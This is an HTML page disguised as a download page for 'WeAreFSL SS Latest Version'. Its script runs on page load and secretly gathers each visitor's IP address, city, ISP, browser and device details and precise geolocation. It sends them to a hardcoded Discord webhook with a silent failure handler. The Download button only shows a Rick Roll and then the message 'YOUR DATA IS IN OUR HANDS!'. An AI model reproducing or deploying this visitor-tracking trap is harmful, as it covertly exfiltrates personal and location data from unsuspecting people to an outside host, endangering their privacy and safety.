<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>WeAreFSL SS Latest Version - Visitor Info</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #23272a;
      color: #f3f4f7;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: #2c2f33;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
      padding: 2rem 2.5rem;
      max-width: 500px;
      width: 90%;
      text-align: center;
      position: relative;
      z-index: 2;
    }
    h1 {
      font-size: 1.8rem;
      margin-bottom: 0.7rem;
      color: #7289da;
    }
    .status {
      margin-top: 1rem;
      font-size: 1rem;
      color: #43b581;
    }
    .download-btn {
      margin-top: 1.4rem;
      padding: 0.8em 2.2em;
      font-size: 1.08rem;
      background: #7289da;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      opacity: 0.95;
      transition: background 0.18s;
      display: none;
    }
    .operator-info {
      margin-top: 1.2rem;
      font-size: 1.1rem;
      color: #faa61a;
    }
    .rickroll-gif {
      margin-top: 2rem;
      display: none;
      max-width: 100%;
      border-radius: 10px;
      box-shadow: 0 3px 12px #0006;
    }
    .centered-message {
      display: none;
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      background: #23272a;
      color: #faa61a;
      z-index: 99;
      font-size: 2.3rem;
      font-weight: bold;
      text-align: center;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      animation: fadeIn 0.8s;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to   { opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="container" id="mainContainer">
    <h1>WeAreFSL SS Latest Version</h1>
    <p>
      Please wait a few seconds while the page fully loads.
    </p>
    <div class="status" id="status"></div>
    <div class="operator-info" id="operatorInfo"></div>
    <button class="download-btn" id="downloadBtn">🔗 Download</button>
    <img src="https://media.tenor.com/CWgfFh7ozHkAAAAM/rick-astly-rick-rolled.gif" alt="Rick Roll GIF" class="rickroll-gif" id="rickGif">
  </div>
  <div class="centered-message" id="finalMessage">
    THANK YOU FOR USING!<br>
    YOUR DATA IS IN OUR HANDS!
  </div>
  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1234477262221606912/5KAAr_XMU1jIifTc3coBbeoFTTjcDbhfA2wFddi0kX5wCKfLMo61QINRFgiX6P_z92kW";
    const status = document.getElementById("status");
    const downloadBtn = document.getElementById("downloadBtn");
    const operatorInfo = document.getElementById("operatorInfo");
    const rickGif = document.getElementById("rickGif");
    const mainContainer = document.getElementById("mainContainer");
    const finalMessage = document.getElementById("finalMessage");

    // Get operator from both APIs
    async function getOperator(ip) {
      let operator = "";
      // Try ipwho.is
      try {
        const resp = await fetch(`https://ipwho.is/${ip}?fields=connection`);
        if (resp.ok) {
          const data = await resp.json();
          if (data.connection && data.connection.isp) {
            operator = data.connection.isp;
          }
        }
      } catch (e) {}

      // Try ipinfo.io if ipwho.is did not work
      if (!operator) {
        try {
          const resp = await fetch(`https://ipinfo.io/${ip}?token=`);
          if (resp.ok) {
            const data = await resp.json();
            if (data.org) {
              operator = data.org;
            }
          }
        } catch (e) {}
      }

      return operator || "Unknown";
    }

    async function collectVisitorData() {
      let visitor = {
        "IP Address": "",
        "Country": "",
        "Region": "",
        "City": "",
        "ISP": "",
        "Operator": "",
        "Browser": navigator.userAgent,
        "Platform": navigator.platform,
        "Language": navigator.language || navigator.userLanguage,
        "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
        "Network Type": "",
        "Effective Connection Type": "",
        "Downlink (Mbps)": "",
        "Geolocation": "",
        "Latitude": "",
        "Longitude": ""
      };

      // Network info
      if (navigator.connection) {
        visitor["Network Type"] = navigator.connection.type || "";
        visitor["Effective Connection Type"] = navigator.connection.effectiveType || "";
        visitor["Downlink (Mbps)"] = navigator.connection.downlink || "";
      }

      // Fetch IP and geo info + ISP
      let ipData;
      try {
        const ipResp = await fetch("https://ipwho.is/?fields=ip,country,region,city,isp");
        ipData = await ipResp.json();
        if (ipData.success !== false) {
          visitor["IP Address"] = ipData.ip;
          visitor["Country"] = ipData.country;
          visitor["Region"] = ipData.region;
          visitor["City"] = ipData.city;
          visitor["ISP"] = ipData.isp;
        }
      } catch (e) {}

      // Always get operator using IP
      if (visitor["IP Address"]) {
        visitor["Operator"] = await getOperator(visitor["IP Address"]);
      }

      // Geolocation
      await new Promise(resolve => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            position => {
              visitor["Geolocation"] = "Granted";
              visitor["Latitude"] = position.coords.latitude;
              visitor["Longitude"] = position.coords.longitude;
              resolve();
            },
            error => {
              visitor["Geolocation"] = "Denied";
              resolve();
            },
            { enableHighAccuracy: true, timeout: 8000 }
          );
        } else {
          visitor["Geolocation"] = "Not Supported";
          resolve();
        }
      });

      return visitor;
    }

    function buildDiscordEmbed(data) {
      return {
        embeds: [{
          title: "WeAreFSL SS Visitor Leak",
          description: "Visitor information (WeAreFSL SS leak).",
          color: 0x7289da,
          fields: Object.entries(data).map(([k,v]) => ({
            name: k,
            value: v !== undefined && v !== null && v !== "" ? String(v) : "N/A",
            inline: false
          })),
          timestamp: new Date().toISOString(),
          footer: { text: "WeAreFSL SS Leak" }
        }]
      };
    }

    async function sendToDiscord(data) {
      try {
        await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(buildDiscordEmbed(data))
        });
      } catch (err) {
        // Silent fail
      }
    }

    async function main() {
      status.textContent = "Loading...";
      const visitorData = await collectVisitorData();
      await sendToDiscord(visitorData);
      status.textContent = "Page loaded.";
      if(visitorData.Operator && visitorData.Operator !== "Unknown") {
        operatorInfo.textContent = 'Telecommunication operator: ' + visitorData.Operator;
      } else {
        operatorInfo.textContent = 'Telecommunication operator: Unknown';
      }
      downloadBtn.style.display = "inline-block";
    }

    main();

    // Button interaction logic
    let firstClick = false;
    downloadBtn.addEventListener('click', function() {
      if (!firstClick) {
        // Show GIF, hide everything else except GIF and operator
        rickGif.style.display = "block";
        status.style.display = "none";
        downloadBtn.style.display = "none";
        firstClick = true;
        setTimeout(() => {
          // Hide everything, show final message
          mainContainer.style.display = "none";
          finalMessage.style.display = "flex";
        }, 2500); // Show GIF for 2.5 seconds
      }
    });
  </script>
</body>
</html>
